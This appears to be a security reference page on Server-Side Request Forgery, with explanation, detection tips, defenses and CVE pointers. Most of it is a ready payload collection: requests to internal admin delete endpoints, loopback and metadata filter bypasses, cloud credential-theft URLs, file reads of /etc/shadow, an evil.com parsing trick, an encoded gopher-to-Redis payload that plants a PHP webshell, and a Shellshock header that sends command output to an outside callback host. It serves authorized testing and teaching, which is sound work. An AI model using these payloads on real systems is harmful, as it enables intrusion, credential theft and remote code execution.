# Server-Side Request Forgery

> The server is coerced into making requests to attacker-chosen internal targets. **Deep dive:**
> [`Troubleshooting_Guide/ssrf.md`](../../../../Troubleshooting_Guide/ssrf.md) ·
> **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** SSRF · A10:2021 Server-Side Request Forgery
**Languages:** English · [Tiếng Việt](README.vi.md)
**Status:** complete

## What it is
SSRF is when an application takes a URL (or host/IP) from the user and fetches it server-side,
letting the attacker point that request at systems the server can reach but they cannot —
internal services, cloud metadata endpoints, or the loopback interface.

## How it works
A feature like "import from URL", webhook, PDF renderer, or image fetcher accepts a URL. The
attacker supplies `http://169.254.169.254/…` (cloud metadata), `http://127.0.0.1:6379/`
(internal Redis), or `file://` schemes. The server makes the request with its own network
position and often its own credentials. Blind SSRF (no response shown) is detected via
out-of-band callbacks.

## Impact
Read cloud instance credentials (classic IMDSv1 metadata theft → account compromise), reach
internal admin panels and databases, port-scan the internal network, hit unauthenticated
internal APIs, and sometimes escalate to RCE against internal services.

## How to detect
- Any parameter containing a URL, hostname, or IP that the server then fetches.
- Out-of-band interaction (Burp Collaborator / your own DNS log) when pointing at a domain you
  control — proves blind SSRF.
- Differential responses/timing between reachable and unreachable internal ports.

## Exploitation (summary)
Confirm the fetch with an OOB canary, then enumerate internal targets (loopback, RFC1918,
metadata IPs). Bypass weak filters with alternate encodings, redirects, DNS rebinding, `[::]`,
decimal/octal IPs, or `@`-tricks in the authority. Escalate via reachable services. Full
techniques in the deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Confirming the fetch
Basic injection into a URL-fetching parameter, then escalate to authenticated internal actions.

```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com

stockApi=http://localhost/admin
```

```http
stockApi=http://localhost/admin/delete?username=carlos
```

Blind SSRF: point an out-of-band canary at a domain you control (Referer is a common sink).

```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-website.com
Referer: http://burpcollaborator.net
```

```http
POST /product/stock HTTP/1.1
stockApi=http://YOUR-COLLABORATOR-DOMAIN.burpcollaborator.net
```

### Loopback / blacklist bypass
Alternate representations of `127.0.0.1` / `localhost` to defeat naive string filters.

```text
http://127.1/admin
http://127.0.0.1/admin
http://2130706433/admin        # decimal IP
http://0x7f.0x0.0x0.0x1/admin  # hex IP
http://0177.0.0.1/admin        # octal IP
http://[::1]/
http://localhost.localdomain/
```

Double URL-encoding the path slips a blocked keyword past the filter:

```text
stockApi=http://127.1/%2561dmin   # %2561 → %61 → 'a' (admin)
```

DNS-based loopback (also useful for rebinding):

```text
http://localtest.me/
http://127.0.0.1.nip.io/
```

### Whitelist bypass via authority parsing
Exploit the gap between what the validator parses and what the HTTP client connects to.

```text
http://expected-domain@evil.com      # connects to evil.com
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

For the fragment trick, `%2523` is a double-encoded `#`: the validator sees `stock.weliketoshop.net` (whitelisted) while the server connects to `localhost:80` after the fragment is stripped.

URL-parser differentials worth trying:

```python
url = "http://expected.com@evil.com/"      # credentials confusion
url = "http://localhost:80#@expected.com/" # fragment confusion
url = "http://expected.com%00.evil.com/"   # null-byte injection
url = "http://expected.com@еvil.com/"       # Unicode (Cyrillic 'е') confusion
```

### SSRF via open redirect
When the fetcher only allows same-origin paths, chain an on-site open redirect to reach internal hosts.

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

### Cloud metadata services
The highest-impact internal target — instance credentials and user-data.

```text
# AWS EC2 (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS IMDSv2 (token-gated)
POST http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
GET  http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: TOKEN

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/
```

If `169.254.169.254` is filtered, try alternate encodings or DNS aliases:

```text
http://[::ffff:169.254.169.254]/
http://0xa9fea9fe/
http://2852039166/
http://0251.0376.0251.0376/
http://169.254.169.254.nip.io/
http://metadata.google.internal/
```

### Protocol smuggling
Non-HTTP schemes read files or talk to internal services directly.

```text
# file:// — read local files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///var/www/html/config.php

# dict:// — probe services
dict://internal:11211/stats   # Memcached
dict://internal:6379/info     # Redis

# gopher:// — send arbitrary TCP bytes
gopher://internal:3306/_...   # MySQL
gopher://internal:6379/_...   # Redis
gopher://internal:25/_...     # SMTP

# others
ldap://internal:389/dc=example,dc=com
tftp://internal/config.txt
```

Gopher → Redis is the classic SSRF-to-RCE pivot (writes a webshell via `CONFIG SET dir`/`dbfilename`):

```text
gopher://redis:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%3c%3fphp%20system%28%24_GET%5b%27cmd%27%5d%29%3b%20%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a*1%0d%0a$4%0d%0aQUIT%0d%0a
```

### Blind SSRF escalation
Without a visible response, infer internal state from timing/errors, or pivot to RCE on vulnerable software.

```python
# Port scanning by timing
stockApi=http://192.168.1.1:22    # open  → quick response
stockApi=http://192.168.1.1:9999  # closed → timeout/slow

# Error-based port detection (http://192.168.1.1:80)
# "Connection refused" → port closed
# "HTTP parse error"   → port open, not HTTP
# valid data           → open HTTP service
```

Shellshock against an internal CGI host reachable only by the server:

```bash
() { :; }; /usr/bin/nslookup $(whoami).burpcollaborator.net
```

```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-website.com
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR.net
Referer: http://192.168.0.1:8080
```

### SSRF through parsers (XXE / SVG)
File-upload and XML endpoints reach the network through entity/resource loading.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal/admin">
]>
<data>&xxe;</data>

<!-- variants -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://internal/admin" />
  <image href="file:///etc/passwd" />
  <style>@import url('http://internal/style.css');</style>
  <script href="http://internal/malicious.js"></script>
</svg>
```

### Bypass test order
A pragmatic escalation ladder when fuzzing a single parameter:

| Try | Payload | Targets |
|-----|---------|---------|
| 1 | `http://localhost/` | naive allow of localhost |
| 2 | `http://127.0.0.1/` | dotted-quad loopback |
| 3 | `http://127.1/` | short-form loopback |
| 4 | `http://0x7f.0.0.1/` | hex-octet filter bypass |
| 5 | `http://2130706433/` | decimal-IP filter bypass |
| 6 | `http://[::1]/` | IPv6 loopback |
| 7 | `http://localhost.localdomain/` | hostname alias |
| 8 | `http://localtest.me/`, `http://127.0.0.1.nip.io/` | DNS rebinding |

## Defenses
1. **Allow-list** destination hosts/schemes; reject by default.
2. Resolve and validate the IP *after* DNS, and block private/link-local ranges (and re-validate
   on redirect to defeat rebinding/TOCTOU).
3. Disable unused URL schemes (`file://`, `gopher://`, `dict://`).
4. Enforce IMDSv2 / remove instance-metadata reliance; segment internal networks.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Server-Side+Request+Forgery
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=SSRF
- **Exploit-DB** — https://www.exploit-db.com/search?q=SSRF
- **GitHub Advisories** — https://github.com/advisories?query=ssrf
- **OSV** — https://osv.dev/list?q=ssrf
- **Community** — r/netsec, HackerOne (`weakness:"Server-Side Request Forgery (SSRF)"`), cloud-security blogs (metadata abuse).
- _Query tip: target URL-fetching features and gateways:_ `"<product>" SSRF metadata`.

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-26855` — Microsoft Exchange "ProxyLogon" SSRF, pre-auth, chained to RCE; mass-exploited.
- `CVE-2021-22054` — VMware Workspace ONE UEM SSRF.
- _Canonical incident: the 2019 Capital One breach abused SSRF to read AWS IMDS credentials._

## References
- PortSwigger Web Security Academy — SSRF.
- OWASP — Server-Side Request Forgery Prevention Cheat Sheet.
